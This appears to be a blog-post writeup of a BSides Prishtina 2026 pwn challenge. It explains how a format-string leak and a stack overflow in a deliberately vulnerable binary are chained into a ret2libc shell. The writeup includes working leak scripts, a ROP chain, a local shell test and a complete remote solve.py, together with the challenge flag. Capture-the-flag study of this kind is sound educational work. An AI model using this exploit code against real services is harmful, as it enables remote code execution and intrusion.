@@ -1,0 +1,763 @@
+﻿---
+title: Pristina Stack
+summary: Pwn challenge writeup from BSides Prishtina 2026.
+tags: CTF Writeups, BSides Prishtina 2026, Pwn
+publishedAt: '2026-05-25'
+public: true
+language: "en"
+translationKey: "bsides-prishtina-2026-pristina-stack"
+---
+| Category                                 | Difficulty | Points | Protocol     |
+| ---------------------------------------- | ---------- | ------ | ------------ |
+| PWN (format-string, ret2libc, stack-bof) | Medium     | 399    | Web Instance |
+
+---
+
+# Introduction
+
+The challenge is a "Pristina Municipal Suggestion Box" CLI binary. It has a menu with four options:
+- Submit a suggestion
+- Review it
+- Finalize/sign it
+- Exit
+
+There are two bugs that chain together:
+1. A format string in option 2
+2. And a stack overflow in option 3
+
+The binary has PIE, NX, and full RELRO, but no stack canary, so once you get your leaks the overflow is clean.
+
+---
+
+# Recon
+
+Before touching anything, I wanted to know what I was dealing with, the architecture, whether it's stripped, what mitigations are on.
+
+```bash
+file chal libc.so.6 ld-linux-x86-64.so.2
+
+# output
+chal:                  ELF 64-bit LSB pie executable, x86-64, dynamically linked,
+                       interpreter /lib64/ld-linux-x86-64.so.2, with debug_info, not stripped
+libc.so.6:             ELF 64-bit LSB shared object, x86-64, dynamically linked, stripped
+ld-linux-x86-64.so.2:  ELF 64-bit LSB shared object, x86-64, dynamically linked, stripped
+```
+
+The binary isn't stripped and has debug info, so all function names will be there in the symbol table. That saves time reversing. The challenge also provides its own libc and loader, which is standard for pwn challenges, it means the remote instance is running the same libc version, so our offsets will match.
+
+**checksec** wasn't on my machine at the time, so I pulled the protection info using **readelf** directly. I need to know this before anything else because it determines what attack paths are even possible.
+
+```bash
+readelf -h -l -W chal
+
+# output
+Type: DYN (Position-Independent Executable file)
+
+GNU_STACK  RW   â† not RWE, so the stack is not executable
+GNU_RELRO  R    â† RELRO is present
+```
+
+```bash
+readelf -d -W chal
+
+# output
+(FLAGS) BIND_NOW
+(FLAGS_1) Flags: NOW PIE
+```
+
+`BIND_NOW` combined with `GNU_RELRO` means **full RELRO**, all relocations are resolved before the program starts, and the GOT is then marked read-only. Overwriting a GOT entry to hijack a function call isn't going to work here.
+
+The compile flags were left in the binary strings, which gave away the rest:
+
+```bash
+strings -tx chal | grep GNU
+```
+
+```
+GNU C17 11.4.0 -mtune=generic -march=x86-64 -g -O0
+-fno-stack-protector -fcf-protection=none -fpie -fno-builtin
+```
+
+`-fno-stack-protector` means **no stack canary**, the single most important thing I see here. With no canary, a stack overflow gives direct RIP control without needing to leak or brute-force anything extra. `-fcf-protection=none` means no Intel CET or IBT, so we don't need to worry about indirect branch tracking getting in the way of our ROP chain.
+
+Full picture:
+- **PIE** â€” binary loads at a random base each run, addresses aren't fixed
+- **NX** â€” can't execute shellcode on the stack
+- **Full RELRO** â€” GOT is locked, no overwrite attacks
+- **No canary** â€” stack overflow goes straight to RIP
+
+The first two force us toward ROP. The third rules out GOT overwrite. The fourth means we just need good leaks and the overflow is game over.
+
+### Symbols
+
+Since the binary isn't stripped:
+
+```bash
+readelf -s -W chal | head -80
+```
+
+```
+12: 0000000000001179   97  FUNC  LOCAL  DEFAULT  15  setup_io
+13: 00000000000011da   67  FUNC  LOCAL  DEFAULT  15  banner
+14: 000000000000121d  102  FUNC  LOCAL  DEFAULT  15  menu
+15: 0000000000001283  129  FUNC  LOCAL  DEFAULT  15  read_line
+16: 0000000000001304  141  FUNC  LOCAL  DEFAULT  15  submit_suggestion
+17: 0000000000001391  119  FUNC  LOCAL  DEFAULT  15  review_suggestion
+18: 0000000000001408  150  FUNC  LOCAL  DEFAULT  15  finalize_submission
+43: 000000000000149e  268  FUNC  GLOBAL DEFAULT  15  main
+```
+
+The names make the program structure obvious without even running it. The three interesting functions are `review_suggestion`, `finalize_submission`, and `main`. I'll be reversing all three.
+
+---
+
+## Running the Binary
+
+Before reversing I always run it once just to understand the user-facing behavior. The challenge provided its own loader, but it came without execute permission:
+
+bash
+
+```bash
+./ld-linux-x86-64.so.2 --library-path . ./chal <<< '4'
+# zsh: permission denied
+```
+
+Easy fix:
+
+```bash
+chmod +x chal ld-linux-x86-64.so.2
+```
+
+Then running with the bundled libc so the environment matches remote exactly:
+
+```bash
+./ld-linux-x86-64.so.2 --library-path . ./chal <<< '4'
+```
+
+```
+============================================================
+ Pristina Municipal Suggestion Box  (citizen terminal v1.3)
+       "Your voice. Acknowledged. Possibly read."
+============================================================
+
+ 1) Submit a suggestion
+ 2) Review your suggestion (printed for clerk approval)
+ 3) Finalize and sign your submission
+ 4) Leave the office
+ > Goodbye.
+```
+
+Four options. The flavor text is funny. Now I know what I'm looking at from a user perspective â€” time to look at what's actually happening under the hood.
+
+---
+
+## Reversing
+
+### main (How the Menu Flows)
+
+```bash
+objdump -d -M intel --start-address=0x149e --stop-address=0x15aa chal
+```
+
+```asm
+000000000000149e <main>:
+    149e:  push   rbp
+    149f:  mov    rbp, rsp
+    14a2:  sub    rsp, 0x120          ; main has a 0x120-byte stack frame
+
+    1540:  lea    rax, [rbp-0x110]    ; address of suggestion buffer
+    1547:  mov    rdi, rax
+    154a:  call   1304 <submit_suggestion>   ; option 1 â€” store user input here
+
+    1551:  lea    rax, [rbp-0x110]    ; same buffer address
+    1558:  mov    rdi, rax
+    155b:  call   1391 <review_suggestion>   ; option 2 â€” pass buffer to review
+
+    1562:  call   1408 <finalize_submission> ; option 3 â€” no argument passed
+```
+
+This tells me the suggestion buffer lives on main's stack at `[rbp-0x110]`. When you pick option 1, your input goes there. When you pick option 2, that same buffer gets passed to `review_suggestion`. Option 3 calls `finalize_submission` with no argument â€” so whatever vulnerability is in there operates independently on its own local stack.
+
+### Bug 1 (Format String in review_suggestion [option 2])
+
+```bash
+objdump -d -M intel --start-address=0x1391 --stop-address=0x1408 chal
+```
+
+```asm
+0000000000001391 <review_suggestion>:
+    1391:  push   rbp
+    1392:  mov    rbp, rsp
+    1395:  sub    rsp, 0x10
+    ...
+    13d7:  mov    rax, QWORD PTR [rbp-0x8]
+    13db:  mov    rdi, rax          ; rax = pointer to the suggestion buffer
+    13de:  mov    eax, 0x0
+    13e3:  call   1040 <printf@plt> ; called with only one argument â€” the buffer itself
+    ...
+    1406:  leave
+    1407:  ret
+```
+
+This is the bug. The suggestion pointer goes directly into `rdi`, the first argument to `printf`, with no format string like `"%s"`. So the call is `printf(suggestion)` where we control `suggestion` entirely.
+
+A format string vulnerability lets us read (and in some cases write) arbitrary memory. Format specifiers like `%p` print values from the stack, and `%N$p` lets you index into specific stack positions. Since we control the entire format string, we can use this to leak whatever is on the stack, including saved return addresses pointing back into libc and the binary.
+
+### Bug 2 (Stack Overflow in finalize_submission [option 3])
+
+```bash
+objdump -d -M intel --start-address=0x1408 --stop-address=0x149e chal
+```
+
+```asm
+0000000000001408 <finalize_submission>:
+    1408:  push   rbp
+    1409:  mov    rbp, rsp
+    140c:  sub    rsp, 0x50          ; allocates a 0x50-byte local buffer
+
+    1442:  lea    rax, [rbp-0x50]   ; points rax at the start of the buffer
+    1446:  mov    edx, 0x200        ; but reads up to 0x200 bytes into it
+    144b:  mov    rsi, rax
+    144e:  mov    edi, 0x0
+    1453:  call   1050 <read@plt>
+    ...
+    149c:  leave
+    149d:  ret
+```
+
+Buffer is `0x50` bytes. `read()` accepts `0x200`. Classic stack buffer overflow, the developer allocated `0x50` but forgot (or didn't care) to limit the read size to match.
+
+The stack layout in `finalize_submission` at the point of the overflow:
+
+```
+[rbp-0x50]  â† start of buffer (we write here)
+...
+[rbp+0x00]  â† saved RBP
+[rbp+0x08]  â† saved RIP  â† we want to overwrite this
+```
+
+So the offset from the start of the buffer to the saved RIP is:
+
+```
+0x50 (buffer) + 0x08 (saved RBP) = 0x58 bytes
+```
+
+With no canary sitting between the buffer and the saved RIP, we just pad 0x58 bytes and then overwrite RIP with whatever we want.
+
+---
+## Leaking ASLR with the Format String
+
+Now I need to figure out which `%N$p` positions on the stack hold useful pointers, specifically something in libc and something in the binary. The approach is simple: send a format string that prints many stack values at once, then cross-reference them against `/proc/<pid>/maps` to figure out what each one points to.
+
+I sent 34 `%N$p` specifiers as the suggestion, then triggered option 2:
+
+```python
+import subprocess
+
+p = subprocess.Popen(
+    ['./ld-linux-x86-64.so.2', '--library-path', '.', './chal'],
+    stdin=subprocess.PIPE,
+    stdout=subprocess.PIPE,
+    stderr=subprocess.PIPE,
+)
+
+p.stdin.write(b'1\n')
+p.stdin.flush()
+p.stdin.write(b'.'.join([f'%{i}$p'.encode() for i in range(1, 35)]) + b'\n')
+p.stdin.flush()
+p.stdin.write(b'2\n4\n')
+p.stdin.flush()
+out, err = p.communicate(timeout=2)
+print(out.decode('latin1'))
+```
+
+Output:
+
+```
+---- BEGIN CLERK REVIEW ----
+0x1.0x1.0x7f13d4114907.0x1c.(nil).0x7f13d437649e.0x7ffe4f25b310.
+0x7ffe4f25b420.0x7f13d4376560.0x32.(nil).0x2432252e70243125...
+----  END CLERK REVIEW  ----
+```
+
+Position 3 and position 6 jumped out immediately, they're in the `0x7f...` range which is where libc and the binary get mapped. I needed to confirm exactly which offsets these corresponded to, so I ran again while simultaneously reading `/proc/<pid>/maps`:
+
+```python
+import subprocess, time, os, fcntl, select
+
+p = subprocess.Popen(
+    ['./ld-linux-x86-64.so.2', '--library-path', '.', './chal'],
+    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+)
+fcntl.fcntl(p.stdout, fcntl.F_SETFL, os.O_NONBLOCK)
+
+def read_avail():
+    time.sleep(0.1)
+    data = b''
+    while True:
+        r, _, _ = select.select([p.stdout], [], [], 0)
+        if not r: break
+        try:
+            chunk = p.stdout.read()
+            if not chunk: break
+            data += chunk
+        except BlockingIOError:
+            break
+    return data
+
+read_avail()
+p.stdin.write(b'1\n%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p\n2\n')
+
+p.stdin.flush()
+out = read_avail() + read_avail()
+print(out.decode('latin1'))
+print('PID', p.pid)
+print(open(f'/proc/{p.pid}/maps').read())
+p.stdin.write(b'4\n')
+p.stdin.flush()
+p.wait()
+```
+
+Output:
+
+```
+---- BEGIN CLERK REVIEW ----
+0x1.0x1.0x7f4f45d14907.0x1c.(nil).0x7f4f45e8549e.0x7ffca4b8b0b0.
+0x7ffca4b8b1c0.0x7f4f45e85560.0x32.(nil)
+----  END CLERK REVIEW  ----
+
+PID 820051
+7f4f45c00000-7f4f45c28000 r--p 00000000 ... libc.so.6
+7f4f45c28000-7f4f45dbd000 r-xp 00028000 ... libc.so.6
+...
+7f4f45e84000-7f4f45e85000 r--p 00000000 ... chal
+7f4f45e85000-7f4f45e86000 r-xp 00001000 ... chal
+```
+
+Now I can do the math:
+
+```
+libc base = 0x7f4f45c00000
+%3$p      = 0x7f4f45d14907
+â†’ offset from libc base = 0x114907
+
+PIE base  = 0x7f4f45e84000
+%6$p      = 0x7f4f45e8549e
+â†’ offset from PIE base  = 0x149e
+```
+
+That `0x149e` offset is the exact symbol offset of `main`, which makes sense, it's probably a saved return address from whoever called main. This means `%6$p` leaks the address of `main` at runtime, and since we know main's offset in the binary (`0x149e`), we can compute PIE base.
+
+Before finalizing these positions I ran it 5 more times to make sure ASLR didn't scramble the positions themselves (it randomizes the base addresses, not which stack slots hold what):
+
+python
+
+```python
+import subprocess, re
+
+payload = b'%3$p.%6$p.%9$p\n'
+for _ in range(5):
+    p = subprocess.Popen(
+        ['./ld-linux-x86-64.so.2', '--library-path', '.', './chal'],
+        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+    )
+    p.stdin.write(b'1\n' + payload + b'2\n4\n')
+    p.stdin.flush()
+    out = p.communicate(timeout=2)[0].decode('latin1')
+    m = re.search(r'BEGIN CLERK REVIEW ----\n([^\n]+)', out)
+    print(m.group(1) if m else 'no match')
+```
+
+```
+0x7f5b3c714907 . 0x7f5b3c8f349e . 0x7f5b3c8f3560
+0x7f1c50114907 . 0x7f1c5036b49e . 0x7f1c5036b560
+0x7f3167714907 . 0x7f316794449e . 0x7f3167944560
+0x7f957db14907 . 0x7f957ddc649e . 0x7f957ddc6560
+0x7f6a1dd14907 . 0x7f6a1dff249e . 0x7f6a1dff2560
+```
+
+Base addresses change every run (ASLR doing its job), but the low 12 bits and the relative offsets stay constant. `%3$p` always ends in `...14907` and `%6$p` always ends in `...149e`. The positions are stable.
+
+Final leak math:
+
+```python
+libc_base = leak_3 - 0x114907
+pie_base  = leak_6 - 0x149e
+```
+
+---
+
+## Building the ROP Chain
+
+With ASLR defeated we have runtime addresses for everything in libc. The plan is ret2libc â€” call `system("/bin/sh")` using libc's own `system` function and `/bin/sh` string. This is the standard approach when you have NX (can't run shellcode) but you can control RIP and you know where libc is.
+
+### Getting system and /bin/sh from libc
+
+```bash
+readelf -s -W libc.so.6 | grep 'system@@\|puts@@\|exit@@'
+```
+
+```
+1429: 0000000000080e50  409  FUNC  WEAK  DEFAULT  15  puts@@GLIBC_2.2.5
+1481: 0000000000050d70   45  FUNC  WEAK  DEFAULT  15  system@@GLIBC_2.2.5
+2760: 00000000000455f0   32  FUNC  GLOBAL DEFAULT  15  exit@@GLIBC_2.2.5
+```
+
+```bash
+strings -a -t x libc.so.6 | grep '/bin/sh'
+```
+
+```
+1d8678 /bin/sh
+```
+
+So `system` is at `libc_base + 0x50d70` and `/bin/sh` is at `libc_base + 0x1d8678`. Both addresses become known once we have the leak.
+
+### Finding Gadgets
+
+To call `system("/bin/sh")` on x86-64, the first argument needs to be in `rdi`. So I need a `pop rdi; ret` gadget to load the `/bin/sh` address into `rdi` before jumping to `system`. I also need a standalone `ret` for stack alignment â€” `system` requires the stack to be 16-byte aligned when called, and the extra `ret` adjusts for that.
+
+`ROPgadget` wasn't on the machine, so I searched for the gadget bytes directly in the libc binary. `pop rdi` is `\x5f` and `ret` is `\xc3`, so `pop rdi; ret` is the two bytes `\x5f\xc3`:
+
+python
+
+```python
+from pathlib import Path
+
+b = Path('libc.so.6').read_bytes()
+for name, pat in [
+    ('pop_rdi_ret', b'\x5f\xc3'),
+    ('ret',         b'\xc3'),
+    ('pop_rsi_ret', b'\x5e\xc3'),
+    ('pop_rdx_ret', b'\x5a\xc3'),
+]:
+    print(name)
+    off, c = 0, 0
+    while True:
+        i = b.find(pat, off)
+        if i < 0 or c >= 10: break
+        print(hex(i))
+        off = i + 1
+        c += 1
+```
+
+```
+pop_rdi_ret
+0x2a3e5
+0x2aad3
+0x2ab4e
+...
+ret
+0x99e
+0x9ba
+0xa47
+...
+```
+
+First hit for `pop rdi; ret` was `0x2a3e5`. I disassembled the surrounding area to confirm it was a real usable gadget and not just a coincidental byte pattern in the middle of something else:
+
+bash
+
+```bash
+objdump -d -M intel --start-address=0x2a3d0 --stop-address=0x2a3f0 libc.so.6
+```
+
+asm
+
+```asm
+2a3dc:  pop    rbx
+2a3dd:  pop    rbp
+2a3de:  pop    r12
+2a3e0:  pop    r13
+2a3e2:  pop    r14
+2a3e4:  pop    r15      ; \x41\x5f  â† r15 uses the REX prefix + 0x5f
+2a3e6:  ret             ; \xc3
+```
+
+Starting at `0x2a3e5` we get `\x5f\xc3`, that's `pop rdi; ret`. And starting at `0x2a3e6` we get just `\xc3` â€” a standalone `ret`. Both gadgets in one spot.
+
+I initially tried using a `ret` from offset `0x99e`, but that address falls in a non-executable mapping for this libc layout and would crash. The `ret` at `0x2a3e6` is in the `.text` segment so it's executable.
+
+Final offsets:
+
+```python
+POP_RDI_RET = 0x2a3e5   # pop rdi; ret
+RET         = 0x2a3e6   # ret (for stack alignment)
+SYSTEM      = 0x50d70
+BIN_SH      = 0x1d8678
+```
+
+### The Chain
+
+```
+[0x58 bytes of padding]    â† fills buffer + overwrites saved RBP
+ret                        â† realigns stack to 16 bytes before system
+pop rdi; ret               â† puts the /bin/sh address into rdi
+address of "/bin/sh"       â† the string argument
+system                     â† system("/bin/sh") â†’ shell
+```
+
+The `ret` before `pop rdi` is there purely for alignment. x86-64 System V ABI requires `rsp` to be 16-byte aligned at a `call` instruction. By the time we're in the middle of our ROP chain, the stack might be off by 8 bytes, the `ret` pops nothing and effectively adjusts the stack pointer by 8, fixing alignment so `system` doesn't crash on an SSE instruction.
+
+```python
+payload  = b"A" * 0x58
+payload += p64(libc + RET)
+payload += p64(libc + POP_RDI_RET)
+payload += p64(libc + BIN_SH)
+payload += p64(libc + SYSTEM)
+```
+
+---
+
+## Local Test
+
+Putting it all together in a test script to confirm the chain works before touching remote:
+
+```python
+import subprocess, struct, re, time, os, fcntl, select, sys
+
+p64 = lambda x: struct.pack('<Q', x)
+
+LIBC_LEAK_OFF = 0x114907
+POP_RDI       = 0x2a3e5
+RET           = 0x2a3e6
+SYSTEM        = 0x50d70
+BINSH         = 0x1d8678
+
+p = subprocess.Popen(
+    ['./ld-linux-x86-64.so.2', '--library-path', '.', './chal'],
+    stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+)
+fcntl.fcntl(p.stdout, fcntl.F_SETFL, os.O_NONBLOCK)
+
+def recv_until(marker, timeout=2):
+    data, end = b'', time.time() + timeout
+    while marker not in data and time.time() < end:
+        r, _, _ = select.select([p.stdout], [], [], 0.05)
+        if r:
+            try:
+                chunk = p.stdout.read()
+            except BlockingIOError:
+                chunk = b''
+            if not chunk: break
+            data += chunk
+    return data
+
+# Step 1: submit the format string as our "suggestion"
+recv_until(b'> ')
+p.stdin.write(b'1\n%3$p.%6$p\n2\n')
+p.stdin.flush()
+
+# Step 2: trigger option 2 to print it and grab the leaks
+out = recv_until(b'END CLERK REVIEW', 2)
+print(out.decode('latin1'))
+
+m = re.search(rb'0x([0-9a-f]+)\.0x([0-9a-f]+)', out)
+libc_leak = int(m.group(1), 16)
+pie_leak  = int(m.group(2), 16)
+libc = libc_leak - LIBC_LEAK_OFF
+print('libc base:', hex(libc))
+print('pie base: ', hex(pie_leak - 0x149e))
+
+# Step 3: trigger option 3 with the overflow payload
+recv_until(b'> ')
+payload  = b'A' * 0x58
+payload += p64(libc + RET)
+payload += p64(libc + POP_RDI)
+payload += p64(libc + BINSH)
+payload += p64(libc + SYSTEM)
+p.stdin.write(b'3\n' + payload + b'\n')
+p.stdin.flush()
+
+# Step 4: interact with the shell we just got
+time.sleep(0.2)
+p.stdin.write(b'id; echo PWNED; exit\n')
+p.stdin.flush()
+time.sleep(0.5)
+
+out = b''
+while True:
+    r, _, _ = select.select([p.stdout], [], [], 0.1)
+    if not r: break
+    try:
+        chunk = p.stdout.read()
+    except BlockingIOError:
+        chunk = b''
+    if not chunk: break
+    out += chunk
+print(out.decode('latin1'))
+```
+
+Output:
+
+```
+---- BEGIN CLERK REVIEW ----
+0x7f619b114907.0x7f619b29f49e
+----  END CLERK REVIEW  ----
+
+libc base: 0x7f619b000000
+pie base:  0x7f619b29e000
+
+Sign your submission (full legal name, no abbreviations):
+> Thank you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
+  Your submission has been notarised.
+
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),...
+PWNED
+```
+
+Shell landed locally. The chain works exactly as expected.
+
+---
+
+## Remote
+
+With the local test passing I packaged everything into a clean `solve.py` and ran it against the remote:
+
+```bash
+./solve.py -c 'cat flag* 2>/dev/null; id; exit'
+```
+
+```
+[+] libc leak: 0x7fe962740907
+[+] libc base: 0x7fe96262c000
+[+] PIE base:  0x55e0eb06c000
+BSidesPR26{c145423bb0b8c9693c3b7638028c811d}
+uid=999(appuser) gid=999(appuser) groups=999(appuser)
+```
+
+The remote libc base ends in `...000` (page-aligned, as expected), the offsets match, and the flag is there.
+
+---
+
+## Full solve.py
+
+```python
+#!/usr/bin/env python3
+import argparse, os, select, socket, struct, subprocess, sys, time
+
+ROOT = os.path.dirname(os.path.abspath(__file__))
+CHAL = os.path.join(ROOT, "chal")
+LD   = os.path.join(ROOT, "ld-linux-x86-64.so.2")
+
+HOST = "challs.bsidesprishtina.org"
+PORT = 30718
+
+LIBC_LEAK_OFF = 0x114907
+MAIN_OFF      = 0x149e
+POP_RDI_RET   = 0x2a3e5
+RET           = 0x2a3e6
+SYSTEM        = 0x50d70
+BIN_SH        = 0x1d8678
+
+def p64(x):
+    return struct.pack("<Q", x)
+
+class Tube:
+    def __init__(self, local=False, host=HOST, port=PORT):
+        self.local = local
+        if local:
+            self.p = subprocess.Popen(
+                [LD, "--library-path", ROOT, CHAL],
+                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            )
+            self.fd = self.p.stdout.fileno()
+        else:
+            self.s = socket.create_connection((host, port))
+            self.fd = self.s.fileno()
+
+    def send(self, data):
+        if isinstance(data, str):
+            data = data.encode()
+        if self.local:
+            self.p.stdin.write(data)
+            self.p.stdin.flush()
+        else:
+            self.s.sendall(data)
+
+    def recv(self, n=4096, timeout=1.0):
+        end = time.time() + timeout
+        out = b""
+        while time.time() < end:
+            r, _, _ = select.select([self.fd], [], [], 0.05)
+            if not r: continue
+            chunk = os.read(self.fd, n)
+            if not chunk: break
+            out += chunk
+            if len(chunk) < n: break
+        return out
+
+    def recv_until(self, marker, timeout=5.0):
+        if isinstance(marker, str):
+            marker = marker.encode()
+        end = time.time() + timeout
+        out = b""
+        while marker not in out and time.time() < end:
+            r, _, _ = select.select([self.fd], [], [], 0.05)
+            if not r: continue
+            chunk = os.read(self.fd, 4096)
+            if not chunk: break
+            out += chunk
+        return out
+
+    def interactive(self):
+        while True:
+            r, _, _ = select.select([self.fd, sys.stdin.fileno()], [], [])
+            if self.fd in r:
+                data = os.read(self.fd, 4096)
+                if not data: return
+                os.write(sys.stdout.fileno(), data)
+            if sys.stdin.fileno() in r:
+                data = os.read(sys.stdin.fileno(), 4096)
+                if not data: return
+                self.send(data)
+
+def exploit(t):
+    t.recv_until(b"> ")
+    t.send(b"1\n%3$p.%6$p\n2\n")
+    leak = t.recv_until(b"----  END CLERK REVIEW  ----")
+
+    marker = b"---- BEGIN CLERK REVIEW ----\n"
+    line = leak.split(marker, 1)[1].split(b"\n", 1)[0]
+    libc_leak_s, pie_leak_s = line.split(b".")
+    libc_leak = int(libc_leak_s, 16)
+    pie_leak  = int(pie_leak_s, 16)
+
+    libc = libc_leak - LIBC_LEAK_OFF
+    pie  = pie_leak  - MAIN_OFF
+    print(f"[+] libc leak: {libc_leak:#x}")
+    print(f"[+] libc base: {libc:#x}")
+    print(f"[+] PIE base:  {pie:#x}")
+
+    t.recv_until(b"> ")
+    payload  = b"A" * 0x58
+    payload += p64(libc + RET)
+    payload += p64(libc + POP_RDI_RET)
+    payload += p64(libc + BIN_SH)
+    payload += p64(libc + SYSTEM)
+    t.send(b"3\n" + payload + b"\n")
+    t.recv_until(b"notarised.\n")
+    return t
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--local", action="store_true")
+    ap.add_argument("--host", default=HOST)
+    ap.add_argument("--port", default=PORT, type=int)
+    ap.add_argument("-c", "--cmd")
+    args = ap.parse_args()
+
+    t = exploit(Tube(args.local, args.host, args.port))
+    if args.cmd:
+        t.send(args.cmd.encode() + b"\n")
+        time.sleep(0.2)
+        sys.stdout.buffer.write(t.recv(timeout=1.0))
+    else:
+        print("[+] shell")
+        t.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+---
